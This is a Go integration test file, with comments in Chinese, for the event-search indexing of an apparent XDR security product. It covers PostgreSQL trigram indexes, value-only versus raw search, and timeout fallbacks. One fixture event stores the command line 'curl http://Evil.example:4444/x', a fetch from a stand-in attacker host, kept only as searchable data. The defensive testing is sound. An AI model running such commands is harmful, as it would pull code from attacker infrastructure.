//go:build integration

package eventsearch

import (
	"context"
	"database/sql"
	"encoding/json"
	"os"
	"strings"
	"testing"
	"time"

	_ "github.com/jackc/pgx/v5/stdlib"

	"openxdr/server/ent"
	"openxdr/server/internal/testdb"
)

func open(t *testing.T) (context.Context, *ent.Client, *sql.DB) {
	t.Helper()
	ctx, client := testdb.New(t)
	db, err := sql.Open("pgx", os.Getenv("INTEGRATION_DATABASE_URL"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { db.Close() })
	for _, name := range []string{oldIndex, newIndex} {
		db.ExecContext(ctx, "DROP INDEX IF EXISTS "+name)
	}
	return ctx, client, db
}

func hits(t *testing.T, ctx context.Context, client *ent.Client, kw string) int {
	t.Helper()
	n, err := client.Event.Query().Where(Keyword(kw).Predicate()).Count(ctx)
	if err != nil {
		t.Fatalf("检索 %q 失败: %v", kw, err)
	}
	return n
}

const raw = `{"process": {"pid": 720634, "uid": "5000508e-c623-4ea9-b9d2-4bbb2dcc5eee",
  "file": {"path": "/usr/bin/curl", "sha256": "43b8d2d049183e9ebc409c86b89150b5a4a68fa19fe1815b16bed5561921a9c3"},
  "cmd_line": "curl http://Evil.example:4444/x 100%_done"}, "activity_id": 1}`

// 新库启动即建值索引：值照常搜得到（大小写不敏感、% _ 是字面量），UUID 与哈希回退全文不漏，
// 字段名不再命中。
func TestEnsureBuildsValueIndex(t *testing.T) {
	ctx, client, db := open(t)
	client.Event.Create().SetTs(time.Now()).SetClassUID(1007).SetSource("agent").SetRaw(json.RawMessage(raw)).SaveX(ctx)

	Ensure(ctx, db)
	if ok, err := validIndex(ctx, db, newIndex); err != nil || !ok || !byValue.Load() {
		t.Fatalf("新库应建好并启用 %s: valid=%v err=%v byValue=%v", newIndex, ok, err, byValue.Load())
	}
	for kw, want := range map[string]int{
		"evil.EXAMPLE": 1, "/usr/bin/curl": 1, "4444": 1, "720634": 1, "100%_done": 1, "100%x": 0,
		"43b8d2d049183e9e": 1, "5000508e-c623": 1, "cmd_line": 0, "nothing-here": 0,
	} {
		if got := hits(t, ctx, client, kw); got != want {
			t.Errorf("检索 %q 命中 %d 条, want %d", kw, got, want)
		}
	}
}

// 有旧索引的库启动不现建新索引（大表上会挡住写入几个小时），仍按 raw::text 匹配；
// 管理员在线建好新索引后重启即切换。
func TestEnsureKeepsOldIndex(t *testing.T) {
	ctx, client, db := open(t)
	client.Event.Create().SetTs(time.Now()).SetClassUID(1007).SetSource("agent").SetRaw(json.RawMessage(raw)).SaveX(ctx)
	if _, err := db.ExecContext(ctx, "CREATE EXTENSION IF NOT EXISTS pg_trgm"); err != nil {
		t.Fatal(err)
	}
	if _, err := db.ExecContext(ctx, "CREATE INDEX "+oldIndex+" ON events USING gin ((raw::text) gin_trgm_ops)"); err != nil {
		t.Fatal(err)
	}

	Ensure(ctx, db)
	if ok, _ := exists(ctx, db, newIndex); ok || byValue.Load() {
		t.Fatalf("已有旧索引时不应现建 %s: exists=%v byValue=%v", newIndex, ok, byValue.Load())
	}
	if got := hits(t, ctx, client, "cmd_line"); got != 1 {
		t.Fatalf("旧口径按整个事件体匹配，字段名应命中: %d", got)
	}

	if _, err := db.ExecContext(ctx, "CREATE INDEX "+newIndex+" ON events USING gin (openxdr_event_search_text(raw) gin_trgm_ops)"); err != nil {
		t.Fatal(err)
	}
	Ensure(ctx, db)
	if !byValue.Load() || hits(t, ctx, client, "cmd_line") != 0 || hits(t, ctx, client, "evil.example") != 1 {
		t.Fatalf("新索引建好后应切到按值匹配: byValue=%v", byValue.Load())
	}
}

// 提速不能改变已建索引的表达式结果，覆盖长度边界、大小写、嵌套值和随机样本。
func TestSearchTextOptimizationEquivalent(t *testing.T) {
	ctx, _, db := open(t)
	if _, err := db.ExecContext(ctx, searchText); err != nil {
		t.Fatal(err)
	}
	const baseline = `CREATE OR REPLACE FUNCTION openxdr_event_search_text_baseline(raw jsonb) RETURNS text
 LANGUAGE sql IMMUTABLE STRICT PARALLEL SAFE AS $$
 SELECT string_agg(v #>> '{}', ' ') FROM jsonb_path_query(raw, 'strict $.**') v
 WHERE jsonb_typeof(v) IN ('string', 'number', 'boolean')
 AND v #>> '{}' !~* '^([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}|[0-9a-f]{32,})$'
 $$`
	if _, err := db.ExecContext(ctx, baseline); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { db.ExecContext(ctx, "DROP FUNCTION IF EXISTS openxdr_event_search_text_baseline(jsonb)") })
	var mismatches int
	err := db.QueryRowContext(ctx, `WITH samples AS (
 SELECT jsonb_build_object('short', left(md5(i::text), i % 33),
 'long', repeat(upper(md5(i::text)), 1 + i % 3),
 'mixed', md5(i::text) || 'G', 'nested', jsonb_build_array(null, true, i, jsonb_build_object('path', '/usr/bin/curl')),
 'uuid', '5000508E-C623-4EA9-B9D2-4BBB2DCC5EEE', 'unicode', '中文 ÄÉＦ') AS raw
 FROM generate_series(1, 10000) i
 UNION ALL SELECT v FROM (VALUES ('null'::jsonb), ('{}'::jsonb), ('[]'::jsonb), ('""'::jsonb), ('123'::jsonb)) x(v)
 ) SELECT count(*) FROM samples WHERE openxdr_event_search_text(raw) IS DISTINCT FROM openxdr_event_search_text_baseline(raw)`).Scan(&mismatches)
	if err != nil {
		t.Fatal(err)
	}
	if mismatches != 0 {
		t.Fatalf("新旧函数输出不一致：%d 个样本", mismatches)
	}
}

// 域名前缀虽为十六进制，仍在值索引中；显式值搜索和完整原文搜索必须有不同且明确的覆盖范围。
func TestExplicitSearchModes(t *testing.T) {
	ctx, client, db := open(t)
	client.Event.Create().SetTs(time.Now()).SetClassUID(4003).SetSource("agent").SetRaw(json.RawMessage(`{"query":{"hostname":"1ecb6066da3755bd9nonce.example.test"},"hash":"43b8d2d049183e9ebc409c86b89150b5a4a68fa19fe1815b16bed5561921a9c3"}`)).SaveX(ctx)
	Ensure(ctx, db)
	if n := client.Event.Query().Where(ValuesKeyword("1ecb6066da3755bd9").Predicate()).CountX(ctx); n != 1 {
		t.Fatal(n)
	}
	if n := client.Event.Query().Where(ValuesKeyword("43b8d2d049183e9e").Predicate()).CountX(ctx); n != 0 {
		t.Fatal(n)
	}
	if n := client.Event.Query().Where(RawKeyword("43b8d2d049183e9e").Predicate()).CountX(ctx); n != 1 {
		t.Fatal(n)
	}
	if n := hits(t, ctx, client, "43b8d2d049183e9e"); n != 1 {
		t.Fatal("原有全局检索丢失哈希")
	}
}

func seed(ctx context.Context, client *ent.Client, at time.Time, n int, cmd string) {
	for i := range n {
		raw := `{"process": {"cmd_line": "` + cmd + `"}, "activity_id": 1}`
		client.Event.Create().SetTs(at.Add(time.Duration(i) * time.Second)).SetClassUID(1007).SetSource("agent").SetRaw(json.RawMessage(raw)).SaveX(ctx)
	}
}

func searchFor(t *testing.T, ctx context.Context, client *ent.Client, kw string, limit int) ([]*ent.Event, bool) {
	t.Helper()
	rows, complete, err := Search(ctx, func() *ent.EventQuery { return client.Event.Query() }, Keyword(kw), limit)
	if err != nil {
		t.Fatalf("检索 %q 失败: %v", kw, err)
	}
	return rows, complete
}

// 最近的行里凑够就不查全量；不够再全量查到更早的匹配；不足 recentRows 行时第一步就是全量。结果都按时间倒序。
func TestSearchRecentThenFull(t *testing.T) {
	ctx, client, db := open(t)
	Ensure(ctx, db)
	defer func(n int) { recentRows = n }(recentRows)
	recentRows = 5

	now := time.Now().Add(-time.Hour)
	seed(ctx, client, now.Add(-30*time.Minute), 1, "old needle")
	seed(ctx, client, now, 10, "noise")
	seed(ctx, client, now.Add(10*time.Minute), 3, "hot needle")

	rows, complete := searchFor(t, ctx, client, "hot", 2)
	if !complete || len(rows) != 2 || !rows[0].Ts.After(rows[1].Ts) {
		t.Fatalf("高频词应在最近行里凑够、按时间倒序: complete=%v n=%d", complete, len(rows))
	}
	rows, complete = searchFor(t, ctx, client, "needle", 10)
	if !complete || len(rows) != 4 || !strings.Contains(string(rows[3].Raw), "old needle") {
		t.Fatalf("最近行里不够时应全量查到更早的匹配: complete=%v n=%d", complete, len(rows))
	}
	recentRows = 100
	if rows, complete = searchFor(t, ctx, client, "needle", 10); !complete || len(rows) != 4 {
		t.Fatalf("总行数不足 recentRows 时第一步即全量: complete=%v n=%d", complete, len(rows))
	}
}

// 索引那档超时就逐行扫更大的窗口：窗口盖住全部数据算完整，盖不住只返回已找到的并标为不完整，不报错。
func TestSearchIndexTimeoutFallsBackToWideScan(t *testing.T) {
	ctx, client, db := open(t)
	Ensure(ctx, db)
	defer func(r, w int, d time.Duration) { recentRows, wideRows, indexBudget = r, w, d }(recentRows, wideRows, indexBudget)
	recentRows, indexBudget = 5, time.Nanosecond

	now := time.Now().Add(-time.Hour)
	seed(ctx, client, now.Add(-30*time.Minute), 1, "old needle")
	seed(ctx, client, now, 10, "noise")
	seed(ctx, client, now.Add(10*time.Minute), 1, "hot needle")

	wideRows = 100
	if rows, complete := searchFor(t, ctx, client, "needle", 10); !complete || len(rows) != 2 {
		t.Fatalf("大窗口盖住全部数据应完整: complete=%v n=%d", complete, len(rows))
	}
	wideRows = 8
	if rows, complete := searchFor(t, ctx, client, "needle", 10); complete || len(rows) != 1 {
		t.Fatalf("大窗口盖不住时应返回已找到的并标不完整: complete=%v n=%d", complete, len(rows))
	}
}
